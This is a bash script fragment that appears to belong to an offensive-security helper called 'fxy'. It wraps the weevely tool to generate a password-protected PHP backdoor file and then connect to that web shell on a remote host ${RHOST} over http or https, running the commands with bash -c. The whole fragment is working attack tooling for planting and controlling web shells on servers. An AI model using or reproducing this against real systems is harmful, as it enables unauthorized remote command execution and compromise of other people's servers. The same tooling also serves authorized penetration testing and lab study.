## weevely [gen|help]^: weevely php shell
# weevely help
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
  echo "Available commands:"
  echo "  fxy weevely gen [file] [password]"
  echo "  fxy weevely [s(sl)|tls] [subdir] [file] [password]"
  exit
fi

# weevely generate
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  getMachinePass
  # filename?
  if [ "$#" -ge 3 ]; then
    FILE="$3"
  fi
  # pasword?
  if [ "$#" -eq 4 ]; then
    PASSWD="$4"
  fi
  CMD="$CMD generate $PASSWD $FILE"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi

# weevely connect mode
if [ "$1" == "weevely" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  PROTO="http"
  SUBDIR="/"
  getMachinePass
  
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$PROTO" == "http" ]; then
      case "$#" in
        "2")  SUBDIR="$2" ;;
        "3")  SUBDIR="$2"; FILE="$3" ;;
        "4")  SUBDIR="$2"; FILE="$3"; PASSWD="$4" ;;
      esac
    elif [ "$PROTO" == "https" ]; then
      case "$#" in
        "3")  SUBDIR="$3" ;;
        "4")  SUBDIR="$3"; FILE="$4" ;;
        "5")  SUBDIR="$3"; FILE="$4"; PASSWD="$5" ;;
      esac
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
